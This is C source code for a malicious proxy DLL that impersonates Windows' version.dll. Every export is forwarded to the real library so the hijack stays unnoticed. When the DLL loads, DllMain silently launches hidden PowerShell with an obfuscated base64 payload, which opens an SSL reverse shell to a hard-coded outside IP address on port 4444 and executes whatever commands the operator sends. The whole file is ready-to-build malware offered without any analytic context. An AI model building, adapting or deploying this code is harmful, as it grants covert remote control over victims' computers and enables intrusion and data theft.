#include <windows.h>

#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.dll.GetFileVersionInfoByHandle")
#pragma comment(linker, "/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoExA")
#pragma comment(linker, "/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoW")
#pragma comment(linker, "/export:VerFindFileA=C:\\Windows\\System32\\version.dll.VerFindFileA")
#pragma comment(linker, "/export:VerFindFileW=C:\\Windows\\System32\\version.dll.VerFindFileW")
#pragma comment(linker, "/export:VerInstallFileA=C:\\Windows\\System32\\version.dll.VerInstallFileA")
#pragma comment(linker, "/export:VerInstallFileW=C:\\Windows\\System32\\version.dll.VerInstallFileW")
#pragma comment(linker, "/export:VerLanguageNameA=C:\\Windows\\System32\\version.dll.VerLanguageNameA")
#pragma comment(linker, "/export:VerLanguageNameW=C:\\Windows\\System32\\version.dll.VerLanguageNameW")
#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.dll.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.dll.VerQueryValueW")

void Payload()
{
    system("powershell -nop -noni -w Hidden -ep Bypass -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEMAbABpAGUAbgB0ACgAIgAxADMAOQAuADUAOQAuADEANAA3AC4AMwAzACIALAA0ADQANAA0ACkACgAkAHMAPQAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgAkAHMAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQAuAFMAcwBsAFMAdAByAGUAYQBtACgAJABzACwAJABGAGEAbABzAGUALAAoAHsAJABUAHIAdQBlAH0AIAAtAGEAcwAgAFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkALgBSAGUAbQBvAHQAZQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAXQApACkACgAkAHMAcwAuAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAEEAcwBDAGwAaQBlAG4AdAAoACIAZgBvAG8ALgB0AGwAZAAiACwAJABOAHUAbABsACwAIgBUAGwAcwAxADIAIgAsACQARgBhAGwAcwBlACkACgAkAHcAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHMAcwApAAoAJAB3AC4AVwByAGkAdABlACgAIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIAKQAKACQAdwAuAEYAbAB1AHMAaAAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQAKAHcAaABpAGwAZQAoACgAJABpAD0AJABzAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZAA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAVABlAHgAdAAuAFUAVABGADgARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkAKQAKACAAIAAgACAAJABzAGIAPQAoAGkAZQB4ACAAJABkACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAgADIAPgAmADEACgAgACAAIAAgACQAcwBiADIAPQAkAHMAYgArACIAUABTACAAIgArACgAcAB3AGQAKQAuAFAAYQB0AGgAKwAiAD4AIAAiAAoAIAAgACAAIAAkAHMAYgA9ACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQAKACAAIAAgACAAJABzAHMALgBXAHIAaQB0AGUAKAAkAHMAYgAsADAALAAkAHMAYgAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACQAcwBzAC4ARgBsAHUAcwBoACgAKQAKAH0ACgAkAGMALgBDAGwAbwBzAGUAKAApAA==");
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Payload();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
